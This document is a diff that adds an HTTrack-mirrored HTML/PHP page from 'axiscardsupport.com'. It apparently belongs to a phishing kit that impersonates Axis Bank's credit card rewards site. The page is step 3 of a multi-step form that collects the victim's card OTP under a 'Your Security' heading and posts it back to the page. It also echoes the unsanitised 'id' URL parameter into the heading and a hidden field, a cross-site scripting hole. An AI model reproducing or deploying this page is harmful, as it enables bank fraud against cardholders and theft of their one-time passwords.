@@ -1,0 +1,188 @@
+<html>
+
+<!-- Mirrored from axiscardsupport.com/axiscard/check-eligibility-step1.php?id=Card%20Protection%20Plan%20Cancellation%20Online by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Jun 2025 05:59:11 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
+<link href="assets/css/bootstrap.min.css" rel="stylesheet">
+<link href="assets/css/style.css" rel="stylesheet">
+<title>Axis Rewards : Update Your Rewards Point</title>
+<link rel="icon" href="img/favicon.html" type="image/gif">
+<style>
+  /* Mark input boxes that gets an error on validation: */
+  input.invalid {
+    background-color: #ef6f1f;
+  }
+
+  /* Hide all steps by default: */
+
+  #prevBtn {
+    background-color: #ef6f1f;
+  }
+
+  /* Make circles that indicate the steps of the form: */
+  .step {
+    height: 15px;
+    width: 15px;
+    margin: 0 2px;
+    background-color: #ef6f1f;
+    border: none;
+    border-radius: 50%;
+    display: inline-block;
+    opacity: 0.5;
+  }
+
+  .step.active {
+    opacity: 1;
+  }
+
+  /* Mark the steps that are finished and valid: */
+  .step.finish {
+    background-color: #0095D9;
+  }
+</style>
+
+
+<body>
+  <header class="head">
+        <div class="container">
+            <nav class="navbar navbar-expand-lg navbar-light py-0">
+                <div class="container">
+                    <a class="navbar-brand" href="#">
+                        <img src="img/ic-logo.jpg" alt="Logo">
+                    </a>
+
+                    <!-- Toggler for mobile offcanvas -->
+                    <button class="navbar-toggler" type="button" data-bs-toggle="offcanvas"
+                        data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar">
+                        <span class="navbar-toggler-icon"></span>
+                    </button>
+
+                    <!-- Desktop Navigation -->
+                    <div class="collapse navbar-collapse justify-content-around d-none d-lg-flex" id="navbarContent">
+                        <ul class="navbar-nav mb-2 mb-lg-0">
+                            <li class="nav-item mx-2 custom-item">
+                                <a class="nav-link" href="#">Credit Cards</a>
+                            </li>
+                            <li class="nav-item mx-2 custom-item">
+                                <a class="nav-link" href="#">Benefits</a>
+                            </li>
+                            <li class="nav-item mx-2 custom-item">
+                                <a class="nav-link" href="#">Pay</a>
+                            </li>
+                            <li class="nav-item mx-2 custom-item">
+                                <a class="nav-link" href="#">Offers</a>
+                            </li>
+                            <li class="nav-item mx-2 custom-item">
+                                <a class="nav-link" href="#">Rewards</a>
+                            </li>
+                            <li class="nav-item mx-2 custom-item">
+                                <a class="nav-link" href="#">Apply</a>
+                            </li>
+                            <li class="nav-item mx-2 custom-item">
+                                <input type="search" class="form-control" placeholder="Search">
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </nav>
+
+            <!-- Offcanvas Menu for Mobile -->
+            <div class="offcanvas offcanvas-start" tabindex="-1" id="offcanvasNavbar"
+                aria-labelledby="offcanvasNavbarLabel">
+                <div class="offcanvas-header">
+                    <h5 class="offcanvas-title" id="offcanvasNavbarLabel">Menu</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+                </div>
+                <div class="offcanvas-body">
+                    <ul class="navbar-nav justify-content-start flex-grow-1 pe-3">
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">Credit Cards</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">Benefits</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">Pay</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">Offers</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">Rewards</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">Apply</a>
+                        </li>
+                        <li class="nav-item mt-3">
+                            <input type="search" class="form-control" placeholder="Search">
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+        </div>
+    </header>
+  <main class="content-section pt-4">
+    <div class="container">
+      <div class="row">
+        <div class="col-md-7">
+          <h1 class="ccoapp-note"><?=$_GET['id'];?></h1>
+          <h4 class="mb-3">Your Security</h4>
+          <div class="ccoapp-tabcntholder">
+          
+         <form class="row g-2" id="regForm" action="" method="post">
+              <!-- One "tab" for each step in the form: -->
+
+              <div class="tab">
+                <h5>Step 3: Security</h5>
+                <div class="row">
+                  <div class="col-sm-6 col-xs-12">
+                    <div class="input-holder has-validation">
+                      <label for="card_OTP">Enter Your OTP</label>
+                      <div class="input-wrapper">
+                        <input class="form-control" type="number" id="card_OTP" name="card_OTP" required>
+                        <input type="hidden" id="custId" name="tid" value="<?=$_GET['id'];?>">
+                      </div>
+                      <div class="invalid-feedback">
+                        Please enter your OTP.
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div style="overflow:auto;">
+                <div style="float:right;">
+                  
+                  <button class="common-button" type="submit" name="submit" id="nextBtn">Next</button>
+                </div>
+              </div>
+              <!-- Circles which indicates the steps of the form: -->
+              <div class="text-center mt-2">
+                <span class="step"></span>
+                <span class="step"></span>
+                <span class="step active"></span>
+              </div>
+            </form>
+          </div>
+        </div>
+        <div class="col-md-5 d-flex align-items-center justify-content-end">
+          <img src="img/formimg.png" alt="" width="90%">
+        </div>
+         <?php
+       echo $text1;
+       ?>
+      </div>
+    </div>
+  </main>
+  <!-- Optional JavaScript; choose one of the two! -->
+  <script src="../../cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <!-- Option 1: Bootstrap Bundle with Popper -->
+  <script src="assets/js/bootstrap.bundle.min.js"></script>
+  <script src="control.html"></script>
+
+</body>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'sg2plzcpnl509084'},{'dcenter':'sg2'},{'cp_id':'10374639'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='../../img1.wsimg.com/signals/js/clients/scc-c2/scc-c2.min.js'></script>
+<!-- Mirrored from axiscardsupport.com/axiscard/check-eligibility-step1.php?id=Card%20Protection%20Plan%20Cancellation%20Online by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Jun 2025 05:59:11 GMT -->
+</html>
